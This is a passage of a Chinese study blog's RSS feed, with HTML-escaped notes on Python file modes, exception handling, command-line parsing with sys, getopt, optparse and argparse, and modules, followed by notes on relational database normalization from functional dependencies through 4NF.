&lt;td style=&#34;text-align:left&#34;&gt;ab&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;a+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ab+&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;文件的读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件的读取&#34;&gt;#&lt;/a&gt; 文件的读取&lt;/h4&gt;
&lt;p&gt;通常对文件的操作包括文件的读取，写入，追加，二进制模式，文本模式，读写模式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;读取文件的内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r&lt;/code&gt; ：读模式（默认可以省略），如果文件不存在会抛出异常&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt; ：读、写模式（可以同其他模式组合使用）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readable()&lt;/code&gt; : 测试文本文件是否可读（能写则返回 Ture）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091321388.png&#34; alt=&#34;image-20230131091321388&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;read(size)&lt;/code&gt; ：读取文件中的 size 字符，如省略则读取全部字符&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091750676.png&#34; alt=&#34;image-20230131091750676&#34; /&gt;&lt;/p&gt;
&lt;p&gt;如果有&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091925769.png&#34; alt=&#34;image-20230131091925769&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readline()&lt;/code&gt; : 读取文件的第一行作为结果返回&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092244773.png&#34; alt=&#34;image-20230131092244773&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readlines()&lt;/code&gt; ：会将文件的每一行作为一个字符串，存入列表返回&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092419709.png&#34; alt=&#34;image-20230131092419709&#34; /&gt;&lt;/p&gt;
&lt;p&gt;也可以使用 for 循环读取文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092552484.png&#34; alt=&#34;image-20230131092552484&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件的写入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;w&lt;/code&gt; ：写入模式，会清空文件原有内容，如果文件不存在会创建文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;x&lt;/code&gt; ：写入模式，如果文件已经存在则抛出异常&lt;/p&gt;
&lt;p&gt;&lt;code&gt;a&lt;/code&gt; ：追加模式，不覆盖原有内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;writable()&lt;/code&gt; ：测试文件是否可写&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093011707.png&#34; alt=&#34;image-20230131093011707&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;write(str)&lt;/code&gt; ：将 str 写入文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093615623.png&#34; alt=&#34;image-20230131093615623&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;文件关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件关闭&#34;&gt;#&lt;/a&gt; 文件关闭&lt;/h4&gt;
&lt;p&gt;使用 close () 函数关闭文件，文件对象会被删除，使得所作的修改保存到文件中，在文件操作中出现了异常很难保证文件正常关闭，这里可以使用 with 关键字&lt;/p&gt;
&lt;h3 id=&#34;异常处理结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异常处理结构&#34;&gt;#&lt;/a&gt; 异常处理结构&lt;/h3&gt;
&lt;p&gt;对于一种高级语言来说，异常处理可以提高文件的健壮性和容错性，使得代码不会因为使用者的错误使用导致系统崩溃，同时可以为使用者提供一些错误提示，异常处理的思路是先进行再处理可能出现的错误&lt;/p&gt;
&lt;h4 id=&#34;tryexcept结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexcept结构&#34;&gt;#&lt;/a&gt; try...except... 结构&lt;/h4&gt;
&lt;p&gt;在 python 的异常处理结构中，这是使用最为频繁的一种结构，当 try 子句代码块执行异常，并且被 except 子句捕获，则执行 except 子句代码块&lt;/p&gt;
&lt;p&gt;例：学校在录入成绩要求成绩为 0-150 的整数，而不接受其他数据类型&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131101411225.png&#34; alt=&#34;image-20230131101411225&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;tryexceptelse结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexceptelse结构&#34;&gt;#&lt;/a&gt; try...except..else.. 结构&lt;/h4&gt;
&lt;p&gt;还是上面的例子，这里的 else 是 except 的否定执行体&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131102111632.png&#34; alt=&#34;image-20230131102111632&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;tryexceptfinally&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexceptfinally&#34;&gt;#&lt;/a&gt; try...except...finally&lt;/h4&gt;
&lt;p&gt;与上面的区别就是，无论 try 子代码块能否正常执行，finally 中的代码都会正常执行&lt;/p&gt;
&lt;p&gt;例：输入两个数进行除法运算，输出最后结构&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131103141816.png&#34; alt=&#34;image-20230131103141816&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;命令行参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令行参数&#34;&gt;#&lt;/a&gt; 命令行参数&lt;/h2&gt;
&lt;p&gt;常见的服务器都是 Linux 系统，并且多数都是无图形化界面的，进行任何的操作都是通过命令行的方式进行，这一块主要是借助 python 提供的几种主流的参数解析工具来实现简单的功能&lt;/p&gt;
&lt;p&gt;Python 中的三个内建模块用于处理命令行参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sys&lt;/li&gt;
&lt;li&gt;getopt&lt;/li&gt;
&lt;li&gt;optparse&lt;/li&gt;
&lt;li&gt;argparse&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sys命令行参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sys命令行参数&#34;&gt;#&lt;/a&gt; sys 命令行参数&lt;/h3&gt;
&lt;p&gt;sys 模块主要用于获取和 Python 解释器相关的信息，可以在 python 交互式解释器中导入 sys 模块，通过内置函数 dir 查询到模块内定义的所有名称，并以一个字符串列表的形式返回&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131110838698.png&#34; alt=&#34;image-20230131110838698&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;sysargv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sysargv&#34;&gt;#&lt;/a&gt; sys.argv&lt;/h4&gt;
&lt;p&gt;以列表的方式获取 python 程序运行的命令行参数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131113706097.png&#34; alt=&#34;image-20230131113706097&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;getopt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getopt&#34;&gt;#&lt;/a&gt; getopt&lt;/h4&gt;
&lt;p&gt;getopt 是对 sys.argv 获取的命令行参数进行二次处理，在运行程序时可能需要根据不通的条件，输入不通的命令行选项来实现不通的功能，例如 - u 后面是用户，-p 后面是密码&lt;/p&gt;
&lt;p&gt;使用 getopt.getopt () 会返回两个列表，一个赋值给 opts 一个赋值给 args&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;opts：是（选项，选项值）的元组为一个元素列表，如果没有选项值为空字符串&lt;/li&gt;
&lt;li&gt;args：存放没用选项单参数的列表，不属于格式信息的剩余的命令行参数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131120822875.png&#34; alt=&#34;image-20230131120822875&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用 sys.argv [1:] 是为了过滤第一个参数&lt;/li&gt;
&lt;li&gt;“u:p” 为定义短格式选项（-），这里的 h 和 u 为两个选项，“h” 后面没有 “:” 表示 h 这个选项没有选项值，而 u 必须有选项值&lt;/li&gt;
&lt;li&gt;[&amp;quot;help&amp;quot;,&amp;quot;file=&amp;quot;] 为定义长格式选项（--），这里 “=” 和上面的短格式选项中的 “:” 一样&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;optparse&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#optparse&#34;&gt;#&lt;/a&gt; optparse&lt;/h4&gt;
&lt;p&gt;主要用于为脚本传递命令参数，采用预先定义好的选项来解析命令行参数，与 getopt 函数不通的是 optparse 可以自动生成帮助信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import optparse

usage=&amp;quot;python&amp;quot;
parser=optparse.OptionParser(usage)
parser.add_option(&#39;-u&#39;,&#39;--user&#39;,dest=&#39;User&#39;,type=&#39;string&#39;,help=&#39;target user&#39;,default=&#39;root&#39;)
parser.add_option(&#39;-p&#39;,&#39;--password&#39;,dest=&#39;Pwd&#39;,type=&#39;string&#39;,help=&#39;target password&#39;)
options,args=parser.parse_args()

print(&amp;quot;option为：&amp;quot;,options)
print(&amp;quot;用户名为：&amp;quot;,options.User)
print(&amp;quot;密码为：&amp;quot;,options.Pwd)
print(&amp;quot;args为：&amp;quot;,args)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131152430672.png&#34; alt=&#34;image-20230131152430672&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以设置多个选项字符串，比如上面的 “-u’，--user’这两个，用的时候任选其一；&lt;/li&gt;
&lt;li&gt;dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数:&lt;/li&gt;
&lt;li&gt;type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型:&lt;/li&gt;
&lt;li&gt;help 用于定义帮助信息:&lt;/li&gt;
&lt;li&gt;default 设置默认值；&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;argparse&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#argparse&#34;&gt;#&lt;/a&gt; argparse&lt;/h4&gt;
&lt;p&gt;相当于 optparse 的一个完善的版本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import argparse
argparse=argparse.ArgumentParser()
argparse.add_argument(&#39;-u&#39;,&#39;--user&#39;,dest=&#39;User&#39;,type=str,default=&#39;root&#39;,help=&#39;target User&#39;)
argparse.add_argument(&#39;-s&#39;,&#39;--sex&#39;,dest=&#39;Sex&#39;,type=str,choices=[&#39;男&#39;,&#39;女&#39;],default=&#39;男&#39;,help=&#39;target Sex&#39;)
argparse.add_argument(&#39;-n&#39;,&#39;--nuaber&#39;,dest=&#39;Nua&#39;,nargs=2,required=True,type=int,help=&#39;target Two Numbers&#39;)
print(argparse.parse_args())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131154514101.png&#34; alt=&#34;image-20230131154514101&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以设置多个选项字符中，比如上面的 “-u’，-user’这两个，用的时候任选其一；&lt;/li&gt;
&lt;li&gt;type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型；&lt;/li&gt;
&lt;li&gt;dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数&lt;/li&gt;
&lt;li&gt;help 用于定义帮助信息；&lt;/li&gt;
&lt;li&gt;default 设贸默认值:&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;模块化编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模块化编程&#34;&gt;#&lt;/a&gt; 模块化编程&lt;/h2&gt;
&lt;h3 id=&#34;python的程序结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的程序结构&#34;&gt;#&lt;/a&gt; Python 的程序结构&lt;/h3&gt;
&lt;p&gt;Python 的程序又包，模块和函数组成&lt;/p&gt;
&lt;p&gt;三者的关系如下图所示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131160222870.png&#34; alt=&#34;image-20230131160222870&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;包是一个完成特定任务的工具箱&lt;/p&gt;
&lt;p&gt;可以提高程序的开发效率，减少编程的复杂度，达到代码重用的效果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模块是处理某一类问题的集合&lt;/p&gt;
&lt;p&gt;模块由函数和类构成，没有 main 函数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数是一段可以重用的又名称的代码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;函数定义调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#函数定义调用&#34;&gt;#&lt;/a&gt; 函数定义 &amp;amp; 调用&lt;/h3&gt;
&lt;p&gt;格式：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def 函数名(形参表):
    函数体与序列
    [retern 表达式] #可选项
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数调用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;函数名(形参表)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;函数必须先定义再使用&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;函数名与变量名的命名规则相同&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131161725327.png&#34; alt=&#34;image-20230131161725327&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;局部变量全局变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局部变量全局变量&#34;&gt;#&lt;/a&gt; 局部变量 &amp;amp; 全局变量&lt;/h3&gt;
&lt;h4 id=&#34;局部变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局部变量&#34;&gt;#&lt;/a&gt; 局部变量&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;局部变量是只能在函数或代码块内使用的变量&lt;/li&gt;
&lt;li&gt;函数或代码段一旦结束，局部变量的生命周期也就结束&lt;/li&gt;
&lt;li&gt;局部变量的作用范围只在其被创建的函数内有效&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;全局变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局变量&#34;&gt;#&lt;/a&gt; 全局变量&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;全局变量是能够被不同的函数、类或文件共享的变量&lt;/li&gt;
&lt;li&gt;在函数之外定义的变量都可以称为全局变量&lt;/li&gt;
&lt;li&gt;全局变量可以被文件内部的任何函数和外部文件访问&lt;/li&gt;
&lt;li&gt;全局变量通常在文件的开始处定义&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;模块导入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模块导入方式&#34;&gt;#&lt;/a&gt; 模块导入方式&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;import 语句，导入整个模块&lt;/li&gt;
&lt;li&gt;from...import... 语句，导入模块的部分属性&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;自定义包和模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义包和模块&#34;&gt;#&lt;/a&gt; 自定义包和模块&lt;/h3&gt;
&lt;p&gt;Python 程序除了可以直接运行，还可以作为模块导入并使用其中的对象，通过__name__属性可以识别程序的使用方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个 Python 脚本在运行时都有一个__name__属性，如果脚本作为模板被导入，则其__name__属性的值被自动设置为模块名&lt;/li&gt;
&lt;li&gt;如果脚本独立运行，则其__name__属性被制动设置为字符串__main__&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于大型软件开发，不可能把所有的代码都放到一个文件中，这样会使得代码难以维护和管理，通常使用包来管理。包是 Python 用来组织命名空间和类的重要方法。在包的每个目录中都要包含一个__init__.py 文件，这个文件是一个空文件，用于表示当前文件夹是一个包，设置__all__变量以及执行初始化包所需要的代码&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/01/05/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/</guid>
            <title>关系数据库理论</title>
            <link>https://blog.xcu.icu/2023/01/05/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/</link>
            <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <pubDate>Thu, 05 Jan 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;以本篇记录学习数据库第六章，关系数据理论章节的内容&lt;/p&gt;
&lt;h2 id=&#34;问题的提出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#问题的提出&#34;&gt;#&lt;/a&gt; 问题的提出&lt;/h2&gt;
&lt;h3 id=&#34;关系模式的表示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系模式的表示&#34;&gt;#&lt;/a&gt; 关系模式的表示&lt;/h3&gt;
&lt;p&gt;关系模式主要由五部分组成，一个五元组：R (U,D,DOM,F).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;R 是关系名&lt;/li&gt;
&lt;li&gt;U 是一组属性&lt;/li&gt;
&lt;li&gt;D 为属性组中的属性的域&lt;/li&gt;
&lt;li&gt;DOM 为属性到域的映射&lt;/li&gt;
&lt;li&gt;F 为属性组 U 上的一组数据的依赖&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由于 D，DOM 与模式设计关系不大，因此本章堪为三元组 R&amp;lt;U,F&amp;gt;&lt;/li&gt;
&lt;li&gt;当且仅当 U 上的一个关系 r 满足 F 时，r 称为关系模式 R&amp;lt;U,F&amp;gt; 的一个关系&lt;/li&gt;
&lt;li&gt;作为二维表，关系要符合一个最基本的条件：每个分量必须是不可分开的数据项。满足了这个关系的关系模式就属于 &lt;code&gt;第一范式&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据依赖：&lt;/p&gt;
&lt;p&gt;是一个关系内部属性与属性之间的一种约束条件，是通过属性间的值的相等与否体现出来的数据间的相互关系&lt;/p&gt;
&lt;p&gt;数据依赖的主要类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数依赖（简记 FD）&lt;/li&gt;
&lt;li&gt;多值依赖（简记 MVD）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;函数依赖的缺点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据冗余&lt;/li&gt;
&lt;li&gt;更新异常&lt;/li&gt;
&lt;li&gt;插入异常&lt;/li&gt;
&lt;li&gt;删除异常&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;一个好的模式应该尽量减少或避免以上的缺点&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;规范化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#规范化&#34;&gt;#&lt;/a&gt; 规范化&lt;/h2&gt;
&lt;h3 id=&#34;函数依赖&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#函数依赖&#34;&gt;#&lt;/a&gt; 函数依赖&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;设R(U)是属性集U上的关系模式，X、Y是U的子集。若对于R(U)的任意一个可能的关系r，r中不可能存在两个元组在X上的属性值相等，而在Y上的属性值不等，则称“X函数确定Y”或“Y函数依赖于x”，记作X+Y。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;对于X中的全部属性的集合才能退出Y的称为Y的完全函数依赖，对于X中只要取部分就可以唯一确定Y的叫做部分完全依赖
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;函数依赖具有传递性，如果X，Y是非平凡函数依赖，且Y函数决定于Z，则可称Z对X传递函数依赖
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#码&#34;&gt;#&lt;/a&gt; 码&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;码的关系模型中的一个重要概念&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以唯一确定一个元组的属性或属性组叫做候选码（该属性是主其他属性的完全依赖）&lt;/li&gt;
&lt;li&gt;与上一个定义相对应的码是超码，该属性组是其他属性的部分完全依赖&lt;/li&gt;
&lt;li&gt;当一个关系模型中有多个候选码的时候选择其中一个作为主码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主属性与非主属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;主属性&lt;/code&gt; 是包含再 &lt;code&gt;任何一个候选码&lt;/code&gt; 中的属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;非主属性&lt;/code&gt; 不包含在任何码中的属性（除了主属性都属于非主属性）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;全码&lt;/code&gt; 一个表的全部属性是码就叫全码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;外码&lt;/code&gt; ， 关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码 (Foreign key) 也称外码&lt;/p&gt;
&lt;h3 id=&#34;范式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#范式&#34;&gt;#&lt;/a&gt; 范式&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105161147908.png&#34; alt=&#34;image-20230105161147908&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;范式是符合某一种级别的关系模式的集合&lt;/code&gt; 。关系数据库中的关系必须满足一定的要求，满足不同程度的要求为不同的范式（简单的理解，范式就是一种规则）&lt;/p&gt;
&lt;p&gt;范式的要求由低到高分为第一范式，第二范式，第三范式，BC 范式，第四范式，第五范式（其中 BC 范式是第三范式的一个补充完善，到底 BC 范式要求一般就称该数据库是比较优化的）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;规范化是指一个低级的范式的关系模型，通过模式分解变为高级别的范式&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;1nf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1nf&#34;&gt;#&lt;/a&gt; 1NF&lt;/h4&gt;
&lt;p&gt;每一个属性都是最小单元不可再分的属性&lt;/p&gt;
&lt;h4 id=&#34;2nf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2nf&#34;&gt;#&lt;/a&gt; 2NF&lt;/h4&gt;
&lt;p&gt;首先要满足第一范式，并且每一个非主属性都 &lt;code&gt;完全函数依赖于任意一个候选码&lt;/code&gt; ，称为第二范式&lt;/p&gt;
&lt;h4 id=&#34;3nf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3nf&#34;&gt;#&lt;/a&gt; 3NF&lt;/h4&gt;
&lt;p&gt;首先满足第一和第二范式，若 R 中不存在这样的码 X，属性组 Y 以及非主属性 Z，三者 &lt;code&gt;不存在传递函数依赖&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;bcnf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bcnf&#34;&gt;#&lt;/a&gt; BCNF&lt;/h4&gt;
&lt;p&gt;对第三范式的一个修改，或是说是一种扩充。&lt;/p&gt;
&lt;p&gt;首先满足第一范式，当 X 函数依赖于 Y 这 X 必定含有码 (每一个决定因素都包含码)&lt;/p&gt;
&lt;p&gt;性质：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有的非主属性都完全函数依赖于每个候选码&lt;/li&gt;
&lt;li&gt;所有主属性都完全函数依赖于每一个不包含它的候选码&lt;/li&gt;
&lt;li&gt;没有任何属性完全函数依赖于非码的任意一组属性&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多值依赖&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#多值依赖&#34;&gt;#&lt;/a&gt; 多值依赖&lt;/h4&gt;
&lt;p&gt;与函数依赖相对应，一个属性无法唯一确定另一个属性&lt;/p&gt;
&lt;p&gt;这样的缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据的冗余度大&lt;/li&gt;
&lt;li&gt;增加操作复杂度&lt;/li&gt;
&lt;li&gt;删除操作复杂&lt;/li&gt;
&lt;li&gt;修改操作复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设 R (U) 是属性 U 上的一个关系模式，X，Y，Z 是 U 的子集，并且 Z=U-X-Y。关系模式 R (U) 中多值依赖 X-&amp;gt;-&amp;gt;Y 成立，当且仅当 R (U) 的任一关系 r，给定的一对 (x,z) 值，有一组 Y 的值，这组值仅仅决定于 x 值而与 z 无关。&lt;/p&gt;
&lt;p&gt;X-&amp;gt;-&amp;gt;Y, 而 Z 为空，这称为平凡的多值依赖否则为非平凡&lt;/p&gt;
&lt;h4 id=&#34;4nf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4nf&#34;&gt;#&lt;/a&gt; 4NF&lt;/h4&gt;
&lt;p&gt;属于第一范式，对于 R 的每个非平凡多值依赖 X-&amp;gt;-&amp;gt;Y (Y 不包含于 X)，X 都含有码，则称为 4NF&lt;/p&gt;
&lt;h2 id=&#34;模式的分解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式的分解&#34;&gt;#&lt;/a&gt; 模式的分解&lt;/h2&gt;
&lt;p&gt;无损连接性，保持函数依赖&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</guid>
            <title>数据库设计</title>
            <link>https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</link>
            <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
            <pubDate>Thu, 05 Jan 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;本篇以记录数据库第七章的学习记录，本章的重点应该再概念结构设计和逻辑结构设计中。&lt;/p&gt;
